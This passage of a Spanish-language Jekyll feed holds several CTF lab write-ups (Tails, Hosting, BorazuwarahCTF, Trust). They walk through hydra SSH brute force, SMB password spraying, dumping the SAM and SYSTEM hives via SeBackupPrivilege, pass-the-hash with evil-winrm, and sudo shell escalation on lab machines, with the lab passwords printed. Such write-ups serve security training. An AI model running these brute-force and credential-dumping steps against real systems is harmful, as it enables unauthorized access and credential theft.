+<p>Ha pasado un tiempo haciendo la búsqueda con <strong>hydra</strong> pero sin resultados.. Investigando un poco aparte de que el significado de <strong>tails</strong> es cola también tiene como significado extremo o final de algo… lo que llega uno a sacar como conclusión que la password tiene que estar al final de la wordlist rockyou por lo que deberemos invertir el diccionario, para probar suerte nuevamente con <strong>hydra</strong></p>
+
+<p><img src="image-4.png" alt="alt text" /></p>
+
+<p>Para eso usaremos el siguiente comando para crear un diccionario nuevo llamado <strong>invertido.txt</strong> que sera lo mismo que el diccionario rockyou pero al revés</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tac rockyou.txt &gt;&gt; invertir.txt
+</code></pre></div></div>
+
+<p>Luego eliminaremos los espacios que quedan dentro del diccionario nuevo. para ello usaremos este comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sed -i 's/ //g' invertido.txt
+</code></pre></div></div>
+
+<p>Ahora con el diccionario nuevo y formateado haremos nuevamente el ataque con <strong>hydra</strong> con el siguiente comando:</p>
+
+<p>Asegurar de cambiar el diccionario rockyou por el nuevo diccionario <strong>invertido.txt</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l tails -P /usr/share/wordlists/invertido.txt ssh://172.17.0.2
+</code></pre></div></div>
+
+<p>Esta vez si se pudo encontrar la password del usuario <strong>tails</strong></p>
+
+<ul>
+  <li><strong>user: tails</strong></li>
+  <li><strong>password: 3117548331</strong></li>
+</ul>
+
+<p><img src="image-5.png" alt="alt text" /></p>
+
+<p>Estamos dentro de la maquina victima siendo el usuario <strong>tails</strong></p>
+
+<p><img src="image-6.png" alt="alt text" /></p>
+
+<p>Probaremos el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> el cual nos dirá si hay binarios vulnerables. Nos dice que hay un usuario (sonic) con mas privilegios que podríamos escalar.</p>
+
+<p><img src="image-7.png" alt="alt text" /></p>
+
+<p>Entonces usaremos el truco de <code class="language-plaintext highlighter-rouge">/bin/bash</code> este comando sirve para abrir una terminal (shell) como si fuera el usuario sonic en este caso. Para ello usamos el comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -u sonic /bin/bash
+</code></pre></div></div>
+
+<p><img src="image-8.png" alt="alt text" /></p>
+
+<p>Ahora usaremos el mismo comando pero  para ser <strong>root</strong>. Para ello usamos el comando:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo -u root /bin/bash</code></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte del comando</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">sudo</code></td>
+      <td>Ejecuta un comando con privilegios elevados</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-u root</code></td>
+      <td>Especifica que se ejecute como el usuario <code class="language-plaintext highlighter-rouge">root</code> (no como tu usuario normal)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/bin/bash</code></td>
+      <td>Es la shell que se va a abrir, una sesión de bash</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Logramos ser <strong>root</strong></p>
+
+<p><img src="image-9.png" alt="alt text" /></p>]]></content><author><name>Mauricio López</name><email>your-email@email.com</email></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[En esta práctica resolveremos una máquina de DockerLabs enfocada en la explotación del servicio SSH (puerto 22) mediante un ataque de fuerza bruta. A lo largo del proceso iremos encontrando distintas pistas que nos guiarán hacia la solución, incluyendo la necesidad de invertir y formatear un diccionario para utilizarlo de forma efectiva y así lograr vulnerar la máquina.]]></summary></entry><entry><title type="html">Maquina Hosting</title><link href="http://localhost:4000/maquina-hosting/" rel="alternate" type="text/html" title="Maquina Hosting" /><published>2025-04-22T16:00:00+00:00</published><updated>2025-04-22T16:00:00+00:00</updated><id>http://localhost:4000/maquina-hosting</id><content type="html" xml:base="http://localhost:4000/maquina-hosting/"><![CDATA[<p><strong>En esta máquina, veremos cómo explotar una vulnerabilidad en un servicio de red utilizando una herramienta de escaneo y ataque. Además, demostraremos que esta máquina tiene una vulnerabilidad de gestión de permisos que puede ser explotada para obtener control total sobre el sistema.</strong></p>
+
+<p><img src="image-24.png" alt="alt text" /></p>
+
+<hr />
+
+<p>Iniciaremos usando la herramienta <strong>netdiscover</strong> para hacer un escaneo a
+ nuestra red y poder identificar la IP de la maquina victima.
+ Identificamos que es la IP <strong>192.168.56.103</strong></p>
+
+<h3 id="currently-scanning-19216856024">Currently Scanning: <code class="language-plaintext highlighter-rouge">192.168.56.0/24</code></h3>
+<p><strong>Screen View:</strong> Unique Hosts<br />
+<strong>Captured ARP Req/Rep Packets:</strong> 3 (from 3 hosts)<br />
+<strong>Total Size:</strong> 180 bytes</p>
+
+<hr />
+
+<table>
+  <thead>
+    <tr>
+      <th>IP Address</th>
+      <th>MAC Address</th>
+      <th>Count</th>
+      <th>Len</th>
+      <th>MAC Vendor / Hostname</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>192.168.56.1</td>
+      <td>0a:00:27:00:00:09</td>
+      <td>1</td>
+      <td>60</td>
+      <td>Unknown vendor</td>
+    </tr>
+    <tr>
+      <td>192.168.56.100</td>
+      <td>08:00:27:a3:c4:d6</td>
+      <td>1</td>
+      <td>60</td>
+      <td>PCS Systemtechnik GmbH</td>
+    </tr>
+    <tr>
+      <td>192.168.56.103</td>
+      <td>08:00:27:b6:28:73</td>
+      <td>1</td>
+      <td>60</td>
+      <td>PCS Systemtechnik GmbH</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>Realizamos un ping a la maquina con IP 192.168.56.103 victima para ver
+ si tenemos comunicación. Vemos que tenemos conectividad y además por
+ el TTL=128 podemos deducir que el S.O es windows.</p>
+
+<p><img src="image.png" alt="alt text" /></p>
+
+<p>Ahora usaremos la herramienta <strong>Nmap</strong> para poder ver todos los puertos
+ que estén abiertos y también ver los servicios que estén corriendo con
+ su versión. Podemos ver varios puertos abiertos.</p>
+
+<p><img src="image-1.png" alt="alt text" /></p>
+
+<p>Empezamos a revisar el <strong>puerto 80</strong> donde hay una pagina corriendo.
+ Procedemos a revisar.</p>
+
+<p><img src="image-2.png" alt="alt text" /></p>
+
+<p>Usaremos la herramienta <strong>dirb</strong> para ver si esta pagina tiene directorios
+ ocultos. Usaremos el diccionario <strong>big.txt **como configuración inicial ya
+ que el diccionario que trae por defecto **common.txt</strong> no pudo detectar
+ ningún directorio.
+ Vemos que se encontró varios directorios, reveizaremos el directorio
+ <strong>192.168.56.103/speed</strong></p>
+
+<p><img src="image-3.png" alt="alt text" /></p>
+
+<p>Es una pagina orientado al hosting</p>
+
+<p><img src="image-4.png" alt="alt text" /></p>
+
+<p>Al revisar mas la pagina podemos ver a los dueños de la empresa speed
+ hosting y podemos notar que abajo de la presentación de cada uno sale
+ un correo lo cual podemos deducir que posiblemente podrían tratarse de
+ posibles usuarios de la maquina victima. Guardaremos estos usuarios en
+ un archivo .txt llamado <strong>usuarios.txt</strong></p>
+
+<p><img src="image-5.png" alt="alt text" /></p>
+
+<p>Anteriormente en el escaneo de <strong>nmap</strong> podíamos ver que estaba el puerto
+ <strong>445</strong> abierto por lo cual es el puerto principal utilizado por SMB en
+ versiones modernas de windows.</p>
+
+<p>Utilizamos la herramienta <strong>netexec</strong> para corroborar esto.</p>
+
+<p><img src="image-6.png" alt="alt text" /></p>
+
+<p>Haremos un ataque de fuerza bruta en el servicio SMB de la maquina
+ victima con las credenciales que encontramos en la pagina y así poder
+ encontrar alguna password que sea de alguno de usuarios que guardamos
+ en el archivo <strong>usuarios.txt</strong>
+ Usaremos el siguiente comando con el txt donde tenemos los nombre de
+ los usuarios encontrados en la pagina y para la password el
+ diccionario <strong>rockyou.txt</strong></p>
+
+<p><img src="image-7.png" alt="alt text" /></p>
+
+<p>Al parecer se encontró una coincidencia del usuario <strong>smith</strong> con password
+ <strong>kissme</strong></p>
+
+<p><img src="image-8.png" alt="alt text" /></p>
+
+<p>Ahora como se encontró un posible usuario y password validaremos que
+ estas credenciales sean correctas.</p>
+
+<p><img src="image-9.png" alt="alt text" /></p>
+
+<p>Ahora veremos si con estas credenciales podemos conectarnos mediante
+ <strong>winrm</strong>. Al parecer no se puede.</p>
+
+<p><img src="image-10.png" alt="alt text" /></p>
+
+<p>Ahora enumeraremos con estas credenciales para ver que podemos
+ encontrar. Para eso usaremos la herramienta <strong>enum4linux</strong>. Podemos ver
+ que hay otro usuario con su password. Usuario <strong>m.davis</strong> pass:
+ <strong>H0$T1nG123!</strong></p>
+
+<p><img src="image-11.png" alt="alt text" /></p>
+
+<p>Probaremos estas credenciales con la herramienta <strong>netexec</strong> usando winrm
+ nuevamente. No coinciden</p>
+
+<p><img src="image-12.png" alt="alt text" /></p>
+
+<p>Al probar la pass <strong>H0$T1nG123!</strong> con los distintos usuarios que aparecen
+ vemos que hubo una coincidencia con el usuario <strong>j.wilson</strong></p>
+
+<p><img src="image-13.png" alt="alt text" /></p>
+
+<p>Ahora nos conectaremos con <strong>evil-winrm</strong> con las credenciales nuevas.
+ Pudimos lograr la conexion de forma exitosa teniendo una <strong>powershell</strong></p>
+
+<p><img src="image-14.png" alt="alt text" /></p>
+
+<p>Al investigar un poco los directorios de este usuario, pudimos
+ encontrar una <strong>flag</strong></p>
+
+<p><img src="image-15.png" alt="alt text" /></p>
+
+<p>Ahora trataremos de escalar hasta ser administrador.
+ Revisamos que permisos tiene este usuario con el comando <strong>whoami /priv.</strong>
+ Podemos ver que este usuario puede hacer algunas cosas en las que
+ destaca la copia de seguridad de archivos y directorios.
+ <strong>SeBackupPrivilege.</strong></p>
+
+<p><strong><span style="color: red; font-size: 30px;">Que es esto?</span></strong></p>
+
+<p><strong>SeBackupPrivilege</strong> es un privilegio extremadamente poderoso en Windows,
+ que permite realizar copias de archivos sin estar limitado por las
+ configuraciones de seguridad y permisos. Aunque es esencial para
+ realizar respaldos de sistemas, puede ser explotado por atacantes para
+ obtener acceso a información sensible si no se gestiona adecuadamente.
+ Al hacer un poco de investigación de como poder usar esto a favor me
+ encontré con el siguiente articulo:</p>
+
+<p>https://www.hackingarticles.in/windows-privilege-escalationsebackupprivilege/</p>
+
+<p>donde nos dice que con el privilegio <strong>SeBackupPrivilege</strong>, un usuario
+ puede hacer copias de seguridad del sistema accediendo a todos los
+ archivos, incluidos los protegidos. Esto permite evadir cualquier
+ restricción de acceso (ACL) impuesta por los administradores, ya que,
+ para realizar una copia de seguridad, el usuario necesita poder leer
+ todos los archivos. Este acceso incluye archivos sensibles como el SAM
+ (que contiene las contraseñas de los usuarios locales) y el Registro
+ de Windows (SYSTEM), donde se almacenan configuraciones críticas del
+ sistema.</p>
+
+<p>Desde la perspectiva de un atacante, este privilegio puede explotarse
+ después de obtener un acceso inicial en el sistema. Al poder leer el
+ archivo SAM, el atacante podría extraer las contraseñas y crackearlas
+ para obtener acceso a cuentas con privilegios elevados, como el
+ administrador, y así escalar privilegios dentro del sistema o la red.</p>
+
+<p><img src="image-16.png" alt="alt text" /></p>
+
+<p>El articulo nos dice que nos tenemos que ir al directorio C:\ para
+ luego crear una carpeta temporal llamada Temp y posicionarnos dentro
+ del directorio recientemente creado.</p>
+
+<p><img src="image-17.png" alt="alt text" /></p>
+
+<p>Ya teniendo los preparativos listos empezamos a explotar este
+ privilegio. Ponemos el siguiente comando <strong>reg save hklm\sam c:\Temp\sam.</strong>
+ Se utiliza el comando reg save para copiar el archivo SAM (Security
+ Account Manager), que contiene las contraseñas locales.</p>
+
+<p>Se hace lo mismo con el archivo SYSTEM, que contiene configuraciones
+ críticas del registro de Windows.</p>
+
+<p><img src="image-18.png" alt="alt text" /></p>
+
+<p>Ahora descargaremos estos archivos Sam y system a nuestra maquina
+ atacante.</p>
+
+<p><img src="image-19.png" alt="alt text" /></p>
+
+<p>Revisamos que se hayan descargado los archivos en nuestra maquina.</p>
+
+<p><img src="image-20.png" alt="alt text" /></p>
+
+<p>Ahora con este comando pypykatz registry –sam sam system extraeremos
+ los las password hash de las cuentas de usuario del archivo sam y
+ system que previamente hemos descargado de la maquina victima.</p>
+
+<p><img src="image-21.png" alt="alt text" /></p>
+
+<p>Ahora que tenemos el hash de administrador entraremos con evil-winrm a
+ la maquina victima. Usaremos el hash de administrator como parámetro
+ de la password en evil-winrm. Somos administrador.</p>
+
+<p><img src="image-22.png" alt="alt text" /></p>
+
+<p>Ahora revisamos los directorios para poder encontrar la segunda flag</p>
+
+<p><img src="image-23.png" alt="alt text" /></p>]]></content><author><name>Mauricio López</name><email>your-email@email.com</email></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[En esta máquina, veremos cómo explotar una vulnerabilidad en un servicio de red utilizando una herramienta de escaneo y ataque. Además, demostraremos que esta máquina tiene una vulnerabilidad de gestión de permisos que puede ser explotada para obtener control total sobre el sistema.]]></summary></entry><entry><title type="html">Maquina BorazuwarahCTF</title><link href="http://localhost:4000/maquina-BorazuwarahCTF/" rel="alternate" type="text/html" title="Maquina BorazuwarahCTF" /><published>2025-04-22T16:00:00+00:00</published><updated>2025-04-22T16:00:00+00:00</updated><id>http://localhost:4000/maquina-BorazuwarahCTF</id><content type="html" xml:base="http://localhost:4000/maquina-BorazuwarahCTF/"><![CDATA[<p>En esta práctica resolveremos una máquina de <strong>DockerLabs</strong> en la que aplicaremos técnicas de <strong>esteganografía</strong> para descubrir <strong>datos ocultos dentro de una imagen</strong>. Dichos datos, presentes en los <strong>metadatos del archivo</strong>, nos proporcionarán la información necesaria para avanzar en el análisis y finalmente <strong>vulnerar la máquina</strong>.</p>
+
+<p><img src="./image.png" alt="alt text" /></p>
+
+<p>Empezaremos haciendo un escaneo de puertos a la maquina <strong>BorazuwarahCTF</strong> con la herramienta <strong>Nmap</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> sudo nmap -p- --open -sSCV --min-rate 5000 -Pn -n -v 172.17.0.2 -oN escaneo
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">sudo</code></td>
+      <td>Se necesita privilegios de administrador para algunos tipos de escaneo (como los de tipo SYN).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">nmap</code></td>
+      <td>Herramienta para escaneo de redes y puertos.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-p-</code></td>
+      <td>Escanea <strong>todos los puertos</strong> (del 1 al 65535).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--open</code></td>
+      <td>Muestra <strong>solo los puertos abiertos</strong>, omite los cerrados y filtrados.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-sSCV</code></td>
+      <td>Combinación de opciones:  <br />• <code class="language-plaintext highlighter-rouge">-sS</code> = Escaneo <strong>SYN</strong> (rápido y sigiloso).  <br />• <code class="language-plaintext highlighter-rouge">-sC</code> = Usa <strong>scripts NSE básicos</strong>, equivalente a <code class="language-plaintext highlighter-rouge">--script=default</code>.  <br />• <code class="language-plaintext highlighter-rouge">-sV</code> = Detecta versiones de servicios.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--min-rate 5000</code></td>
+      <td>Intenta enviar <strong>al menos 5000 paquetes por segundo</strong> (muy rápido). ⚠️ Puede generar falsos positivos si la red no lo soporta bien.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-Pn</code></td>
+      <td>No hace <strong>ping previo</strong> al host (asume que está vivo). Útil si ICMP está bloqueado.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-n</code></td>
+      <td>No resuelve nombres DNS (más rápido).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-v</code></td>
+      <td>Modo <strong>verborreico</strong>: muestra más detalles durante el escaneo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">172.17.0.2</code></td>
+      <td>IP del objetivo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-oN escaneo</code></td>
+      <td>Guarda el resultado en un archivo llamado <code class="language-plaintext highlighter-rouge">escaneo</code> en formato <strong>legible para humanos</strong> (normal output).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos muestra que esta maquina tiene 2 puerto abierto.</p>
+
+<ul>
+  <li>puerto 22 ssh version 9.2</li>
+  <li>puerto 80 http</li>
+</ul>
+
+<p><img src="image-1.png" alt="alt text" /></p>
+
+<p>Revisaremos el puerto 80 para ver que pagina esta corriendo. Sale la imagen de un kinder sorpresa.
+También revise el código fuente de la pagina pero no se encontró nada raro.</p>
+
+<p><img src="image-2.png" alt="alt text" /></p>
+
+<p>Usaremos la herramienta gobuster para hacer fuzzing y ver si se esconde directorios ocultos. Para eso usaremos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sh
+
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte del comando</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">gobuster dir</code></td>
+      <td>Ejecuta Gobuster en modo <strong>“dir”</strong> (para buscar directorios/archivos).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-u http://172.17.0.2</code></td>
+      <td>La <strong>URL objetivo</strong> del sitio que estás escaneando.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></td>
+      <td><strong>Wordlist</strong>: lista de palabras (directorios y archivos) que Gobuster probará.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-x php,txt,sh</code></td>
+      <td>Prueba <strong>extensiones de archivo</strong> comunes: <code class="language-plaintext highlighter-rouge">.php</code>, <code class="language-plaintext highlighter-rouge">.txt</code>, y <code class="language-plaintext highlighter-rouge">.sh</code>.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Tampoco encontramos nada.</p>
+
+<p><img src="image-3.png" alt="alt text" /></p>
+
+<p>Cuando se nos presenta estas situaciones donde lo único que tenemos como pista es una imagen, podemos sacar como conclusión de que esta imagen puede contener <strong>metadatos</strong></p>
+
+<h2 id="que-son-los-metadatos">Que son los metadatos?</h2>
+
+<p><strong>Metadatos</strong> son <em>datos incrustados en un archivo</em> (como una imagen, documento o video) que describen información sobre el contenido, sin formar parte del contenido visible.</p>
+
+<p>Para ver los <strong>metadatos</strong> de esta imagen usaremos la herramienta <strong>exiftool</strong>. Para ello descargare la imagen llamándola <strong>imagen.jpeg</strong> y la guardare en mi ruta de trabajo.
+Luego usare el siguiente comando <code class="language-plaintext highlighter-rouge">exiftool imagen.jpeg</code></p>
+
+<p>Como se puede ver la imagen si escondía <strong>metadatos</strong> donde nos da lo siguiente:</p>
+
+<ul>
+  <li>User: borazuwarah</li>
+  <li>Password: ———-</li>
+</ul>
+
+<p><img src="image-4.png" alt="alt text" /></p>
+
+<p>Ahora que tenemos un posible usuario, podríamos usar <strong>hydra</strong> para buscar el password de este usuario. Usaremos e siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+</code></pre></div></div>
+
+<p>Encontramos el password de este usuario. Ahora como esta maquina tenia el puerto 22 SSH abierto usaremos estas credenciales para poder acceder a la maquina victima</p>
+
+<ul>
+  <li>login: borazuwarah</li>
+  <li>password: 123456</li>
+</ul>
+
+<p><img src="image-5.png" alt="alt text" /></p>
+
+<p>Pudimos entrar sin problemas con las credenciales.</p>
+
+<p><img src="image-6.png" alt="alt text" /></p>
+
+<p>Al realizar el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> podemos ver que este usuario puede pasar a root usando el truco de /bin/bash.</p>
+
+<p><img src="image-7.png" alt="alt text" /></p>
+
+<p>Entonces pondremos el siguiente comando: <code class="language-plaintext highlighter-rouge">sudo -u root /bin/bash</code>. Somos <strong>root</strong>.</p>
+
+<p><img src="image-8.png" alt="alt text" /></p>]]></content><author><name>Mauricio López</name><email>your-email@email.com</email></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[En esta práctica resolveremos una máquina de DockerLabs en la que aplicaremos técnicas de esteganografía para descubrir datos ocultos dentro de una imagen. Dichos datos, presentes en los metadatos del archivo, nos proporcionarán la información necesaria para avanzar en el análisis y finalmente vulnerar la máquina.]]></summary></entry><entry><title type="html">Maquina Trust</title><link href="http://localhost:4000/maquina-trust/" rel="alternate" type="text/html" title="Maquina Trust" /><published>2025-04-22T16:00:00+00:00</published><updated>2025-04-22T16:00:00+00:00</updated><id>http://localhost:4000/maquina-trust</id><content type="html" xml:base="http://localhost:4000/maquina-trust/"><![CDATA[<p>Vamos a trabajar con una máquina de <strong>Dockerlabs</strong> en la que aprenderemos a utilizar la herramienta <strong>Hydra</strong> para realizar un ataque de <strong>fuerza bruta sobre el servicio SSH</strong>, con el objetivo de <strong>comprometer y tomar control de la máquina víctima</strong>.</p>
+
+<p><img src="image-2.png" alt="alt text" /></p>
+
+<hr />
+
+<p>Empezaremos haciendo un escaneo de puertos a la maquina <strong>Trust</strong> con la herramienta <strong>Nmap</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> sudo nmap -p- --open -sSCV --min-rate 5000 -Pn -n -v 172.18.0.2 -oN escaneo
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">sudo</code></td>
+      <td>Se necesita privilegios de administrador para algunos tipos de escaneo (como los de tipo SYN).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">nmap</code></td>
+      <td>Herramienta para escaneo de redes y puertos.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-p-</code></td>
+      <td>Escanea <strong>todos los puertos</strong> (del 1 al 65535).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--open</code></td>
+      <td>Muestra <strong>solo los puertos abiertos</strong>, omite los cerrados y filtrados.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-sSCV</code></td>
+      <td>Combinación de opciones:  <br />• <code class="language-plaintext highlighter-rouge">-sS</code> = Escaneo <strong>SYN</strong> (rápido y sigiloso).  <br />• <code class="language-plaintext highlighter-rouge">-sC</code> = Usa <strong>scripts NSE básicos</strong>, equivalente a <code class="language-plaintext highlighter-rouge">--script=default</code>.  <br />• <code class="language-plaintext highlighter-rouge">-sV</code> = Detecta versiones de servicios.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--min-rate 5000</code></td>
+      <td>Intenta enviar <strong>al menos 5000 paquetes por segundo</strong> (muy rápido). ⚠️ Puede generar falsos positivos si la red no lo soporta bien.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-Pn</code></td>
+      <td>No hace <strong>ping previo</strong> al host (asume que está vivo). Útil si ICMP está bloqueado.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-n</code></td>
+      <td>No resuelve nombres DNS (más rápido).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-v</code></td>
+      <td>Modo <strong>verborreico</strong>: muestra más detalles durante el escaneo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">172.18.0.2</code></td>
+      <td>IP del objetivo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-oN escaneo</code></td>
+      <td>Guarda el resultado en un archivo llamado <code class="language-plaintext highlighter-rouge">escaneo</code> en formato <strong>legible para humanos</strong> (normal output).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos muestra que esta maquina tiene 2 puertos abiertos.</p>
+
+<ul>
+  <li>Puerto 22 SSH en la versión <strong>9.2</strong></li>
+  <li>Puerto 80 donde esta corriendo un servicio <strong>Http</strong></li>
+</ul>
+
+<p><img src="image-3.png" alt="alt text" /></p>
+
+<p>Revisaremos inmediatamente la pagina que esta corriendo por el puerto 80 sin antes asignarle un dominio local para mayor comodidad. Este dominio se llamara <strong>victima.in</strong></p>
+
+<p><img src="image-4.png" alt="alt text" /></p>
+
+<p>Al revisar la pagina vemos la clásica pagina de apache. Nada fuera de lo normal. También inspeccionemos el código fuente de la pagina no logramos hallar nada interesante.</p>
+
+<p><img src="image-5.png" alt="alt text" /></p>
+
+<p>Usare la herramienta <strong>Gobuster</strong> para hacer <strong>fuzzing</strong> para tratar de buscar directorios ocultos en la pagina. Para esto usare el siguiente comando:</p>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">gobuster</code></td>
+      <td>Es una herramienta para hacer <strong>fuzzing</strong> (fuerza bruta) de directorios, subdominios, etc. en servidores web.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">dir</code></td>
+      <td>Modo de operación: <strong>escaneo de directorios y archivos web</strong>.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-u http://172.18.0.2</code></td>
+      <td>URL del objetivo: se va a escanear ese servidor buscando rutas ocultas.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></td>
+      <td>Ruta del <strong>diccionario de palabras</strong> que se usará para probar directorios y archivos comunes (como <code class="language-plaintext highlighter-rouge">/admin</code>, <code class="language-plaintext highlighter-rouge">/login</code>, <code class="language-plaintext highlighter-rouge">/uploads</code>, etc).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>No se encontró nada interesante, solo la típica pagina de <strong>server status</strong>. Dado esto usaremos el mismo comando pero con la diferencia que le vamos a especificar los archivos de interés que quiero que se centre en buscar</p>
+
+<p><img src="image-6.png" alt="alt text" /></p>
+
+<p>Usaremos el comando:</p>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sh</code></p>
+
+<p>Lo único que se agrego fue <code class="language-plaintext highlighter-rouge">-x php,txt,sh</code> para que se centre en buscar archivos con extensiones .php, txt y sh.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-x php,txt,sh</code></td>
+      <td><strong>Extensiones de archivos</strong> que se agregarán a cada palabra del diccionario. Probará cosas como:• <code class="language-plaintext highlighter-rouge">/admin.php</code>• <code class="language-plaintext highlighter-rouge">/login.txt</code>• <code class="language-plaintext highlighter-rouge">/config.sh</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora encontró muchos mas directorios ocultos entre los cuales llama uno poderosamente la atención que es <strong>secret.php</strong></p>
+
+<p><img src="image-7.png" alt="alt text" /></p>
+
+<p>Al entrar al directorio <strong>secret.php</strong> nos muestra la siguiente pagina, donde podríamos tener un posible usuario llamado <strong>Mario</strong>.</p>
+
+<p><img src="image-8.png" alt="alt text" /></p>
+
+<p>En el escaneo de <strong>Nmap</strong> se había visto que estaba abierto el puerto <strong>22 SSH</strong>. Lo que se podría hacer de aquí en adelante seria hacer <strong>fuerza bruta</strong> con la herramienta hydra, ya que  tendríamos un posible usuario llamado <strong>Mario</strong>.</p>
+
+<h2 id="que-es-ataque-de-fuerza-bruta">Que es ataque de fuerza bruta?</h2>
+
+<p>En ciberseguridad, un ataque de <strong>fuerza bruta</strong> es una técnica en la que un atacante <strong>prueba todas las combinaciones posibles</strong> de credenciales (usuario/contraseña) o claves, hasta encontrar la correcta y obtener acceso no autorizado a un sistema.</p>
+
+<h3 id="️-cómo-funciona">⚔️ ¿Cómo funciona?</h3>
+
+<p>El atacante usa un <strong>script o herramienta automatizada</strong> que prueba miles o millones de combinaciones rápidamente, por ejemplo:</p>
+
+<p><code class="language-plaintext highlighter-rouge">admin:123456</code>
+<code class="language-plaintext highlighter-rouge">admin:password</code>
+<code class="language-plaintext highlighter-rouge">admin:qwerty</code>
+<code class="language-plaintext highlighter-rouge">admin:admin123</code>
+<code class="language-plaintext highlighter-rouge">...</code></p>
+
+<p>Usaremos la herramienta hydra para hacer fuerza bruta mediante el <strong>puerto 22 SSH</strong> usando como usuario <strong>mario</strong>. Para ello usaremos el siguiente comando:</p>
+
+<p><code class="language-plaintext highlighter-rouge">hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2</code></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Opción</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
